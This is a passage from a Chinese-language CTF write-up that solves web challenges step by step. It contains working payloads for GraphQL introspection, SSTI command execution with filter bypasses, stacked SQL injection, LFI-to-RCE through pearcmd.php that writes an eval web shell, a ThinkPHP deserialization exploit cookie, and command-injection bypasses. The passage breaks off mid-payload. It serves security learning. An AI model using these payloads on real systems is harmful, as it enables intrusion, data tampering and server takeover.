                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">function</span> <span class="token function-definition function">send</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
                <span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
                        <span class="token string single-quoted-string">'http'</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
                            <span class="token string single-quoted-string">'method'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
                            <span class="token string single-quoted-string">'header'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'Content-type: application/json'</span><span class="token punctuation">,</span>
                            <span class="token string single-quoted-string">'content'</span> <span class="token operator">=&gt;</span> <span class="token variable">$data</span><span class="token punctuation">,</span>
                            <span class="token string single-quoted-string">'timeout'</span> <span class="token operator">=&gt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">60</span>
                        <span class="token punctuation">)</span>
                    <span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://graphql:8080/v1/graphql"</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'{"query":"query{\nusers_user_by_pk(id:'</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">') {\nname\n}\n}\n", "variables":null}'</span><span class="token punctuation">;</span>
                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token operator">-&gt;</span><span class="token property">users_user_by_pk</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">!==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ID: "</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;Name: "</span> <span class="token operator">.</span> <span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token operator">-&gt;</span><span class="token property">users_user_by_pk</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b&gt;Can't found it!&lt;/b&gt;&lt;br&gt;&lt;br&gt;DEBUG: "</span><span class="token punctuation">;</span>
                            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;b&gt;Hacker! Only Number!&lt;/b&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;b&gt;No Data?&lt;/b&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>可以知道是要post一个data变量</p> 
<p>一般考察的是，内省查询，就是本来只应该内部进行访问，但配置错误导致攻击者可以获得这些消息。</p> 
<pre><code>{"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
</code></pre> 
<p>查询这些数据就会返回所以的API信息</p> 
<p><img src="https://images2.imgbox.com/3e/ce/XtpY8vNF_o.png" alt="image-20221116002637864"></p> 
<p>搜索flag关键字 找到flag的接口<code> ffffllllaaagggg_1n_h3r3_flag</code></p> 
<p>现在只需要读flag就好了，当然也是通过graphQL的格式来读，看源码里读数据的格式</p> 
<pre><code>{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}
</code></pre> 
<p><img src="https://images2.imgbox.com/1f/ac/vQlQPClP_o.png" alt="image-20221116003421228"></p> 
<p>尝试读到数据，进行模仿读取flag</p> 
<pre><code>{"query":"query{\nffffllllaaagggg_1n_h3r3_flag{\nflag\n}\n}\n","variables":null}
</code></pre> 
<p><img src="https://images2.imgbox.com/33/71/SZQ080zX_o.png" alt="image-20221116003527088"></p> 
<h2><a id="week3_329"></a>week3</h2> 
<h3><a id="BabySSTI_One_331"></a>BabySSTI_One</h3> 
<p>简单的SSTI</p> 
<p><img src="https://images2.imgbox.com/66/73/2QSizbpC_o.png" alt="image-20221116180007755"></p> 
<p>是过滤了一些关键词class什么的，<code>lipsum</code>这条链子直接梭了</p> 
<pre><code class="prism language-python"><span class="token operator">/</span>?name<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('nl /fl*').read()"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p>常规思路打一波：</p> 
<p>关键字被ban了可以用字符拼接一下<code> {<!-- -->{""['__cla'+'ss__']}}</code></p> 
<p>先读基类和所有子类</p> 
<pre><code class="prism language-php"><span class="token operator">/</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">""</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__cla'</span><span class="token operator">+</span><span class="token string single-quoted-string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__bas'</span><span class="token operator">+</span><span class="token string single-quoted-string">'e__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__subcl'</span><span class="token operator">+</span><span class="token string single-quoted-string">'asses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/09/e1/Z7jUCuur_o.png" alt="image-20221119144959273"></p> 
<p>拿到后脚本跑一下 找敏感类</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> json

a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, ......"""</span>

num <span class="token operator">=</span> <span class="token number">0</span>
allList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"&gt;"</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> i
        allList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token string">"\n"</span> <span class="token keyword">or</span> i <span class="token operator">==</span> <span class="token string">","</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> i

<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>allList<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"os._wrap_close"</span> <span class="token keyword">in</span> v<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"---&gt;"</span> <span class="token operator">+</span> v<span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/7b/fe/T5z356pb_o.png" alt="image-20221119145327438"></p> 
<p>即用<code>__subclasses__()[117]</code></p> 
<p>到了下一个点，<code>.init.globals</code>，这个<code>init</code>用来初始化类，<code>globals</code>用来全局查找所有方法和变量及参数是有<code>popen</code>的，这个就可以命令执行了</p> 
<pre><code class="prism language-php"><span class="token operator">/</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">""</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__cla'</span><span class="token operator">+</span><span class="token string single-quoted-string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__bas'</span><span class="token operator">+</span><span class="token string single-quoted-string">'e__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__subcl'</span><span class="token operator">+</span><span class="token string single-quoted-string">'asses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__in'</span><span class="token operator">+</span><span class="token string single-quoted-string">'it__'</span><span class="token punctuation">]</span><span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/63/be/9IZr3fyP_o.png" alt="image-20221119150107314"></p> 
<p>成功执行命令,最终payload</p> 
<pre><code class="prism language-php"><span class="token operator">/</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string double-quoted-string">""</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__cla'</span><span class="token operator">+</span><span class="token string single-quoted-string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__bas'</span><span class="token operator">+</span><span class="token string single-quoted-string">'e__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__subcl'</span><span class="token operator">+</span><span class="token string single-quoted-string">'asses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__in'</span><span class="token operator">+</span><span class="token string single-quoted-string">'it__'</span><span class="token punctuation">]</span><span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl /fl*'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<h3><a id="multiSQL__401"></a>multiSQL 堆叠注入</h3> 
<p><img src="https://images2.imgbox.com/ca/06/S6YcPxM2_o.png" alt="image-20221119133035929"></p> 
<p>堆叠注入</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">';show databases#
1'</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token keyword">from</span> english<span class="token comment">#</span>
<span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> score<span class="token comment">#</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/bc/b6/ulEhcUOO_o.png" alt="image-20221119134341931"></p> 
<p>现在的目的是帮助火华用户修改成绩，然后验证成绩才能得到flag</p> 
<p>fuzz一下 很多关键字被ban了 ，<code>update，select，insert</code></p> 
<p><strong>1,用replace代替insert进行修改</strong></p> 
<pre><code class="prism language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">replace</span> <span class="token keyword">into</span> score <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">"火华"</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c2/7e/f2aadC6U_o.png" alt="image-20221119134702306"></p> 
<p>删除 第一个火华 ,然后拿到flag</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">delete</span> <span class="token keyword">from</span> score <span class="token keyword">where</span> listen<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/eb/63/sUfUsF49_o.png" alt="image-20221119134826601"></p> 
<p><strong>2，利用预处理prepare，然后<code>concat</code>拼接字符串绕过</strong></p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">';set @sql=concat('</span>up<span class="token string">','</span><span class="token keyword">date</span> <span class="token identifier"><span class="token punctuation">`</span>score<span class="token punctuation">`</span></span> <span class="token keyword">set</span> listen<span class="token operator">=</span><span class="token number">200</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">"火华"</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> payload <span class="token keyword">FROM</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">execute</span> payload<span class="token comment">#</span>
</code></pre> 
<p><strong>3，尝试写shell</strong></p> 
<p>没有成功</p> 
<h3><a id="IncludeTwo__pearcmdphp_445"></a>IncludeTwo pearcmd.php的利用</h3> 
<blockquote> 
 <p>How to RCE via LFI? P…</p> 
</blockquote> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/base64|rot13|filter/i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>这题是直接过滤了filter协议 ，这里可以考虑<code>pearcmd.php</code>的利用，参考P神的文章</p> 
<p>https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</p> 
<p><code>config-create</code>命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p> 
<pre><code class="prism language-php"><span class="token operator">/</span><span class="token operator">?</span><span class="token operator">+</span>config<span class="token operator">-</span>create<span class="token operator">+</span><span class="token operator">/</span><span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>pearcmd<span class="token operator">&amp;</span><span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">+</span><span class="token operator">/</span>tmp<span class="token operator">/</span>shell<span class="token operator">.</span>php
</code></pre> 
<p><img src="https://images2.imgbox.com/d0/c9/ybV5D6DL_o.png" alt="image-20221119180050556"></p> 
<img src="https://images2.imgbox.com/f6/dd/YnDp9C10_o.png" alt="image-20221119180115854"> 
<p>访问shell文件即可rce</p> 
<h3><a id="Maybe_You_Have_To_think_More_479"></a>Maybe You Have To think More</h3> 
<p><img src="https://images2.imgbox.com/bb/87/GonFuI3M_o.png" alt="image-20221119181349159"></p> 
<p>访问一个错误页面就得到了TP的版本信息</p> 
<p>整个页面是输入用户名的框 ，会将用户名存在cookie里面 以序列化语句+base64存入</p> 
<p><code>O:17:"first\second\user":2:{s:8:"username";s:5:"12345";s:8:"password";N;}</code></p> 
<p><img src="https://images2.imgbox.com/a4/5f/EMtRm2u9_o.png" alt="image-20221119180734527"></p> 
<p>所以反序列化点在cookie</p> 
<p>网上有exp可以用https://www.freebuf.com/vuls/263977.html</p> 
<pre><code>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=
</code></pre> 
<p>放入cookie</p> 
<p>然后get一个id执行命令 ，flag在环境变量里</p> 
<p><img src="https://images2.imgbox.com/a0/72/B8NbMAtq_o.png" alt="image-20221119184449481"></p> 
<h2><a id="week4_507"></a>week4</h2> 
<h3><a id="So_Baby_RCE_509"></a>So Baby RCE</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|&lt;|&gt;|`|\/| |\\\\|\*/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Don't Hack Me"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>主要是过滤文件读取命令 空格 /目录分隔符</p> 
<p>看mochu师傅是：利用<code>cd</code>切换目录，<code>&amp;&amp;</code>执行多条命令，<code>$@</code>绕过关键字 <code>sort</code>命令也可以读文件，学习一波</p> 
<pre><code>/?cmd=cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26ls
</code></pre> 
<p><img src="https://images2.imgbox.com/90/b8/Srog5HSw_o.png" alt="image-20221120013747764"></p> 
<pre><code>/?cmd=cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26sort${IFS}fff?llllaaaaggggg
$@绕过关键字 
/?cmd=cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26ca$@t${IFS}ffff$@llllaaaaggggg
</code></pre> 
<h3><a id="BabySSTI_Two_543"></a>BabySSTI_Two</h3> 
<p>过滤比较上周更严 首先双引号" 就没了，但单引号’ . __ 还在</p> 
<p>+被禁了，那么字符拼接就先放弃</p> 
<p>还有一种思路是字符串逆序</p> 
<p><code>{<!-- -->{''['__ssalc__'[::-1]]}}</code> 来凑出关键字</p> 
<pre><code class="prism language-python"><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__ssalc__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sesab__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sessalcbus__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__ssalc__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sesab__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sessalcbus__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__tini__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__slabolg__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'nepop'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__ssalc__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sesab__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__sessalcbus__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__tini__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__slabolg__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span 